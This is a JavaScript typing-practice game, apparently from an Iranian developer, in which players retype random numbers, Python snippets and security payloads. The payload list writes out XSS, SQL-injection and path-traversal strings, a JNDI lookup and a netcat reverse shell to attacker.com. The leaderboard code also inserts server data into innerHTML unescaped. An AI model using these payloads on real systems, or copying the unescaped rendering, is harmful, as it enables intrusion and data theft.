let currentWord = "";
let score = 0;
let timer, countdown;
let timeLeft = 0;

const wordDiv = document.getElementById('word');
const input = document.getElementById('input');
const scoreSpan = document.getElementById('score');
const timerDiv = document.getElementById('timer');
const recordsTable = document.getElementById('records');

document.getElementById('start').onclick = startGame;
document.getElementById('stop').onclick = stopGame;
input.addEventListener('keydown', (e) => {
  if(e.key === "Enter") checkInput();
});

// پایلودهای پیش‌فرض + پیشرفته
const payloads = [
  "<script>alert(1)</script>", "' OR '1'='1", "../../etc/passwd",
  "http://169.254.169.254/latest/meta-data/", "<img src=x onerror=alert(1)>",
  "${jndi:ldap://attacker.com/a}", "`cat /etc/passwd`", "; DROP TABLE users;",
  "'; exec xp_cmdshell('dir'); --", 
  `"><svg/onload=confirm(document.domain)>`,
  `' AND SLEEP(5) --`, `" UNION SELECT null, password FROM users --`,
  `| nc attacker.com 4444 -e /bin/bash`,
  `127.0.0.1:3306/admin`,
  `"><iframe srcdoc="<script>alert('dom xss')"></iframe>`,
  `' OR ASCII(SUBSTRING((SELECT database()),1,1))>100 --`,
];

// تولید خودکار پایلود
function generateAutoPayload() {
  let base = ["<script>alert(", "' OR '1'='", "../../", "http://", "<img src=x onerror=", "${jndi:ldap://"];
  let end = [")</script>", " --", "/etc/passwd", "attack.com", "alert(1)>", "evil.com/a}"];
  return base[getRandomInt(0, base.length-1)] + getRandomInt(10,99) + end[getRandomInt(0, end.length-1)];
}

// بقیه توابع
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
function generateRandomNumber() {
  let length = getRandomInt(6,16);
  return Array.from({length}, () => getRandomInt(0,9)).join('');
}
function generateRandomFunction() {
  let names = ["calculate", "process_data", "check_user", "myFunc", "doSomething"];
  let paramsList = [["a","b"],["x","y","z"],["user"],["data"],["val"]];
  let bodies = [
    ["result = a + b", "return result"],
    ["total = x * y * z", "print(total)", "return total"],
    ["if user == 'admin':", "    return True", "return False"],
    ["for d in data:", "    print(d)", "return len(data)"],
    ["return val * 42"]
  ];
  let idx = getRandomInt(0, names.length -1);
  let name = names[idx];
  let params = paramsList[idx];
  let body = bodies[idx].join("\n    ");
  return `def ${name}(${params.join(", ")}):\n    ${body}`;
}
function getRandomWord() {
  let r = Math.random();
  if(r < 0.25) return { type:"number", value: generateRandomNumber() };
  else if(r < 0.5) return { type:"payload", value: payloads[getRandomInt(0,payloads.length-1)] };
  else if(r < 0.75) return { type:"payload", value: generateAutoPayload() };
  else return { type:"function", value: generateRandomFunction() };
}
function startGame() {
  score = 0;
  updateScore();
  nextWord();
}
function stopGame() {
  clearTimeout(timer);
  clearInterval(countdown);
  saveRecordToServer(score);
  loadRecords();
}
function updateScore() {
  scoreSpan.textContent = score;
}
function checkInput() {
  if(input.value.trim() === currentWord) {
    animateResult(true);
    score += 100;
  } else {
    animateResult(false);
    score -= 100;
  }
  updateScore();
  nextWord();
}
function animateResult(success) {
  wordDiv.className = success ? "word success" : "word fail";
  setTimeout(()=> wordDiv.className = "word", 500);
}
function nextWord() {
  clearTimeout(timer);
  clearInterval(countdown);
  let data = getRandomWord();
  currentWord = data.value;
  wordDiv.textContent = currentWord;
  input.value = "";
  timeLeft = data.type==="number" ? 30 : data.type==="function" ? 30 : 30;
  timerDiv.textContent = "⏱ زمان باقی‌مانده: "+timeLeft;
  countdown = setInterval(()=>{
    timeLeft--;
    timerDiv.textContent = "⏱ زمان باقی‌مانده: "+timeLeft;
    if(timeLeft<=0) clearInterval(countdown);
  },1000);
  timer = setTimeout(()=>{
    animateResult(false);
    score -= 100;
    updateScore();
    nextWord();
  }, timeLeft*1000);
}
async function saveRecordToServer(newScore) {
  if(newScore===0) return;
  let now = new Date();
  let dateStr = now.toLocaleDateString('fa-IR')+" "+now.toLocaleTimeString('fa-IR');
  await fetch('/api/save-score',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({score:newScore,date:dateStr})
  });
}
async function loadRecords() {
  let res = await fetch('/api/get-scores');
  let records = await res.json();
  recordsTable.innerHTML = "<tr><th>#</th><th>امتیاز</th><th>تاریخ</th></tr>";
  records.forEach((rec,idx)=>{
    recordsTable.innerHTML+=`<tr><td>${idx+1}</td><td>${rec.score}</td><td>${rec.date}</td></tr>`;
  });
}
window.onload=loadRecords;